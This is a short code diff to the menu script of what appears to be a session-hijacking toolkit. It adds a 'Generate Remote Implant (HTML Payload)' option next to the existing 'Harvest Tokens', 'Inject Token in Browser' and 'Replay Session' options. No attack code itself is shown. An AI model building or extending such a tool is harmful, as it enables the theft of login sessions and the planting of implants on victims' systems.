@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import time
 
 BANNER = r'''
@@ -16,7 +17,8 @@ MENU = '''
 [1] Harvest Tokens
 [2] Inject Token in Browser
 [3] Replay Session (API Mode)
-[4] Exit
+[4] Generate Remote Implant (HTML Payload)
+[0] Exit
 '''
 
 def main():
@@ -36,10 +38,13 @@ def main():
             import token_replayer
             token_replayer.run()
         elif choice == "4":
-            print("Goodbye hacker 💀")
+            from hijax_remote_implant import generate_payload
+            generate_payload()
+        elif choice == "0":
+            print("bye bye hacker 💀")
             break
         else:
-            print("Invalid option. Try again.")
+            print("[!] Invalid option. Try again.")
 
 if __name__ == "__main__":
     main()
